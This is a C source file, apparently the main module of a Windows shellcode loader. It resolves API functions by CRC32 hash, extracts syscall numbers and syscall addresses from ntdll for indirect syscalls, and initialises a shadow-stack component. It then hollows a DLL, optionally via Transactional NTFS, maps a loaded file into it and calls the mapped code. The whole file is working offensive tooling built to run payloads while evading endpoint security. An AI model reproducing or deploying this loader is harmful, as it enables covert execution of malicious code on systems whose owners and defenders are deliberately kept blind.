#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "init.h"
#include "hollower.h"
#include "crc32.h"
#include "shadowKiller.h"

#define TPAGE_GUARDDEMO             0x100 

BOOL bTxF = TRUE;

BOOL FunSyscallJmp(PUINT_PTR pNt, HANDLE hNtdll, PDWORD wNt, PUINT_PTR sysAddrNt, DWORD funHash)
{
	UINT_PTR	pNtTest			= 0;
	DWORD		wNtTest			= 0;
	UINT_PTR	sysAddrNtTest	= 0;
	pNtTest = (UINT_PTR)ByGetProcAddress(hNtdll, funHash);
	wNtTest = ((unsigned char*)(pNtTest + 4))[0];//找ssn
	sysAddrNtTest = pNtTest + 0x12;//找syscall
	if (wNtTest == 0 && sysAddrNtTest == 0)
	{
		return FALSE;
	}
	*pNt = pNtTest;
	*wNt = wNtTest;
	*sysAddrNt = sysAddrNtTest;
	return TRUE;
}

VOID SyscallJmpInit()
{
	HANDLE   hNtdll						= NULL;
	UINT_PTR pNtCreateSection			= 0;
	UINT_PTR pNtMapViewOfSection		= 0;
	UINT_PTR pNtCreateTransaction		= 0;
	UINT_PTR pNtProtectVirtualMemory	= 0;
	UINT_PTR pNtClose					= 0;
	UINT_PTR pNtQueryVirtualMemory		= 0;
	UINT_PTR pNtFreeVirtualMemory		= 0;

	hNtdll = ByGetModuleHandle(ntdll_CRC32b);

	if (!FunSyscallJmp(&pNtCreateSection, hNtdll, &wNtCreateSection,
		&sysAddrNtCreateSection, NtCreateSection_CRC32b))
		return;


	if (!FunSyscallJmp(&pNtMapViewOfSection, hNtdll, &wNtMapViewOfSection,
		&sysAddrNtMapViewOfSection, NtMapViewOfSection_CRC32b))
		return;

	if (!FunSyscallJmp(&pNtCreateTransaction, hNtdll, &wNtCreateTransaction, &sysAddrNtCreateTransaction, NtCreateTransaction_CRC32b))
		return;

	if (!FunSyscallJmp(&pNtProtectVirtualMemory, hNtdll, &wNtProtectVirtualMemory,
		&sysAddrNtProtectVirtualMemory, NtProtectVirtualMemory_CRC32b))
		return;

	if (!FunSyscallJmp(&pNtClose, hNtdll, &wNtClose, &sysAddrNtClose, NtClose_CRC32b))
		return;

	if (!FunSyscallJmp(&pNtQueryVirtualMemory, hNtdll, &wNtNtQueryVirtualMemory, &sysAddrNtQueryVirtualMemory, NtQueryVirtualMemory_CRC32b))
		return;

	if (!FunSyscallJmp(&pNtFreeVirtualMemory, hNtdll, &wNtFreeVirtualMemory, &sysAddrNtFreeVirtualMemory, NtFreeVirtualMemory_CRC32b))
		return;

}

BOOL K32FunInit()
{
	HMODULE hk32 = ByGetModuleHandle(kernel32_CRC32b);

	k32Api.pCreateFileW				= (bypass_CreateFileW)ByGetProcAddress(hk32, CreateFileW_CRC32b);
	k32Api.pGetFileSize				= (bypass_GetFileSize)ByGetProcAddress(hk32, GetFileSize_CRC32b);
	k32Api.pReadFile				= (bypass_ReadFile)ByGetProcAddress(hk32, ReadFile_CRC32b);
	k32Api.pCreateFileTransactedW	= (bypass_CreateFileTransactedW)ByGetProcAddress(hk32, CreateFileTransactedW_CRC32b);
	k32Api.pGetSystemDirectoryW		= (bypass_GetSystemDirectoryW)ByGetProcAddress(hk32, GetSystemDirectoryW_CRC32b);
	k32Api.pFindFirstFileW			= (bypass_FindFirstFileW)ByGetProcAddress(hk32, FindFirstFileW_CRC32b);
	k32Api.pSetFilePointer			= (bypass_SetFilePointer)ByGetProcAddress(hk32, SetFilePointer_CRC32b);
	k32Api.pFindNextFileW			= (bypass_FindNextFileW)ByGetProcAddress(hk32, FindNextFileW_CRC32b);
	k32Api.pFindClose				= (bypass_FindClose)ByGetProcAddress(hk32, FindClose_CRC32b);
	k32Api.pWriteFile				= (bypass_WriteFile)ByGetProcAddress(hk32, WriteFile_CRC32b);
	if (!k32Api.pCreateFileW && !k32Api.pGetFileSize &&
		!k32Api.pReadFile && !k32Api.pCreateFileTransactedW &&
		!k32Api.pGetSystemDirectoryW && !k32Api.pFindFirstFileW &&
		!k32Api.pSetFilePointer && !k32Api.pFindNextFileW &&
		!k32Api.pFindClose && !k32Api.pWriteFile)
	{
		return FALSE;
	}

	if (bTxF && sysJmpNtCreateTransaction == NULL) {
		bTxF = FALSE;
		printf("- TxF is not handled on this system. Disabling preference.\r\n");
	}
	return TRUE;
}

BOOL FunInit()
{
	SyscallJmpInit();

	if (!K32FunInit())
	{
		return FALSE;
	}
	return TRUE;
}

#ifdef _DEBUG
int main()
#else
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
//	lpCmdLine, int nCmdShow)
extern __declspec (dllexport) int CreateMoudle()
#endif // _DEBUG
{
	uint8_t* pMapBuf		= NULL;
	uint8_t* pMappedCode	= NULL;
	uint64_t qwMapBufSize	= 0;
	uint32_t dwFileSize		= 0;
	uint8_t* pFileBuf		= NULL;
	uint32_t dwBytesRead	= 0;

	if (!FunInit())
	{
		return -1;
	}

	ShadowStackInit();

	if (!GetFileLoad(&pFileBuf, &dwFileSize))
	{
		return -1;
	}

	if (HollowDLLPro(&pMapBuf, &qwMapBufSize, pFileBuf, dwFileSize, &pMappedCode, bTxF)) {
		printf("+ Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", pMapBuf, qwMapBufSize);
		printf("* Calling 0x%p...\r\n", pMappedCode);
		((fnAddr)pMappedCode)();
	}

	return 0;
}